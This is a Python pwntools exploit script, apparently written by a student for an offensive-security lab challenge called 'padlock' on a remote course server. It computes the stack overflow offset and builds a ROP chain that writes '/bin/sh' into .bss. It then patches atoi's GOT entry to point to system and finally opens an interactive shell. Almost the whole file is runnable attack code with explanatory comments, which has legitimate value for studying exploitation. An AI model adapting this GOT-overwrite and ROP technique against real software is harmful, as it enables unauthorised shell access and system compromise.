#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13513

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab8/challenges/04_padlock/padlock', checksec=False)
context.arch = 'amd64'

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('/home/kali/Desktop/offsec/labs/lab8/challenges/04_padlock/libc.so.6', checksec=False)
#the remote server is using a different version of libc than my kali linux machine

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b'combination: ')
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

#in a specific libc version, the offsets are determined
atoi_offset   = libc.sym.atoi
system_offset = libc.sym.system
read_offset = libc.sym.read

# convert the Python negative integer into its 64-bit two’s complement representation, with the AND
delta_system = (system_offset - atoi_offset) & 0xffffffffffffffff 

# i want to use the add_what_where gadget to add an offset to the atoi GOT entry, so that it points to the sytem call function
# so that when the prograam calls atoi, in reality atoi@plt will look into atoi@got which contains instead the absoulte address of system
ATOI_PLT = elf.plt['atoi']

#bin_sh_string_addr = next(elf.search(b'/bin/sh'))    #address of "bin/sh"" -> NOT IN THE FILE

#since no /bin/sh string in the file, i write it to .bss writable region then point to it

bin_sh_string_addr = elf.sym.vault   #choose a address in bss where to put my binsh string

r=conn()

# ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,

    # read(0, binsh_addr, 8)
    p64(elf.sym.pop_rdi_ret), p64(0),                       # arg1 of read, fd. Read from stdin=0
    p64(elf.sym.pop_rsi_ret), p64(bin_sh_string_addr),      # arg2 of read, buf: address where to put the read string: binsh_addr
    p64(elf.sym.pop_rdx_ret), p64(8),                       # arg3 of read: number of bytes to read, 8
    p64(elf.plt['read']),                                          

    # write offset intto got to make it call system
    p64(elf.sym.pop_rsi_ret), p64(delta_system),  # offset in rsi
    p64(elf.sym.pop_rdi_ret), p64(elf.got['atoi']),         # where to write the offset in rdi: in atoi@got
    p64(elf.sym.add_what_where),

    # system("bin/sh") (with atoi)
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(bin_sh_string_addr),      # system arg 1: the "bin/sh" string, so i pass its address
    p64(ATOI_PLT),                                          
)

r.recvuntil(b'combination: ')
r.send(payload)
r.send(b"/bin/sh\x00")  #after overflow, rop executes read, waiting for 8 bytes, read into binsh_addr
r.interactive()
